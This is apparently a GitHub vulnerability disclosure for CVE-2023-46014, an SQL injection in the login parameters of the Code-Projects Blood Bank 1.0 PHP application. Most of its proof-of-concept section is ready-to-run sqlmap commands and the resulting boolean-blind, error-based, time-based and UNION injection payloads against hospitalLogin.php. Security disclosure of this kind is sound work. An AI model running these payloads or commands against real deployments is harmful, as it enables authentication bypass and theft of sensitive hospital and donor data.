# CVE-2023-46014-Code-Projects-Blood-Bank-1.0-SQL-Injection-Vulnerability
+ Exploit Author: ersinerenler
# Vendor Homepage
+ https://code-projects.org/blood-bank-in-php-with-source-code
# Software Link
+ https://download-media.code-projects.org/2020/11/Blood_Bank_In_PHP_With_Source_code.zip
# Overview
+ Code-Projects Blood Bank V1.0 is susceptible to a significant security vulnerability that arises from insufficient protection on the 'hemail' and 'hpassword' parameters in the hospitalLogin.php file. This flaw can potentially be exploited to inject malicious SQL queries, leading to unauthorized access and extraction of sensitive information from the database.
# Vulnerability Details
+ CVE ID: CVE-2023-46014
+ Affected Version: Blood Bank V1.0
+ Vulnerable File: /hospitalLogin.php
+ Parameter Names: hemail, hpassword
+ Attack Type: Local
# References:
+ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-46014
+ https://nvd.nist.gov/vuln/detail/CVE-2023-46014
# Description
+ The lack of proper input validation and sanitization on the 'hemail' and 'hpassword' parameters allows an attacker to craft SQL injection queries, bypassing authentication mechanisms and gaining unauthorized access to the database

<img width="1113" alt="image" src="https://github.com/ersinerenler/CVE-2023-46014-Code-Projects-Blood-Bank-1.0-SQL-Injection-Vulnerability/assets/113091631/4470e7ff-b4f1-4839-9b3b-36bcd68d6503">

# Proof of Concept (PoC) : 
+ `sqlmap -u "http://localhost/bloodbank/file/hospitalLogin.php" --method POST --data "hemail=test@test&hpassword=test&hlogin=Login" -p hemail --risk 3 --level 3 --dbms mysql --batch --current-db`

```
---
Parameter: hemail (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: hemail=test@test' AND 3778=(SELECT (CASE WHEN (3778=3778) THEN 3778 ELSE (SELECT 9754 UNION SELECT 4153) END))-- -&hpassword=test&hlogin=Login

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: hemail=test@test' OR (SELECT 3342 FROM(SELECT COUNT(*),CONCAT(0x716a7a6b71,(SELECT (ELT(3342=3342,1))),0x7170767a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- NSQu&hpassword=test&hlogin=Login

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: hemail=test@test' AND (SELECT 5639 FROM (SELECT(SLEEP(5)))ulgW)-- QYnb&hpassword=test&hlogin=Login

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: hemail=test@test' UNION ALL SELECT CONCAT(0x716a7a6b71,0x567a4f6f4b556976707668696878754f48514d6e63424a706f70714e6f62684f504a7a565178736a,0x7170767a71),NULL,NULL,NULL,NULL,NULL-- -&hpassword=test&hlogin=Login
---
```
+ `sqlmap -u "http://localhost/bloodbank/file/hospitalLogin.php" --method POST --data "hemail=test@test&hpassword=test&hlogin=Login" -p hpassword --risk 3 --level 3 --dbms mysql --batch --current-db`

```
---
Parameter: hpassword (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: hemail=test@test&hpassword=test' AND 4940=(SELECT (CASE WHEN (4940=4940) THEN 4940 ELSE (SELECT 5623 UNION SELECT 6789) END))-- -&hlogin=Login

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: hemail=test@test&hpassword=test' OR (SELECT 8207 FROM(SELECT COUNT(*),CONCAT(0x716a7a6b71,(SELECT (ELT(8207=8207,1))),0x7170767a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- TrPm&hlogin=Login

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: hemail=test@test&hpassword=test' AND (SELECT 3303 FROM (SELECT(SLEEP(5)))PdPC)-- lTZZ&hlogin=Login

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: hemail=test@test&hpassword=test' UNION ALL SELECT NULL,CONCAT(0x716a7a6b71,0x5271514f636f6f46476f6365424b6e6166454c725751704d6f6c467968626a4e725172785955416d,0x7170767a71),NULL,NULL,NULL,NULL-- -&hlogin=Login
---
```

+ current database: `bloodbank`
<img width="1447" alt="image" src="https://github.com/ersinerenler/CVE-2023-46014-Code-Projects-Blood-Bank-1.0-SQL-Injection-Vulnerability/assets/113091631/2d932b0a-4a01-4064-9b08-607204433d10">
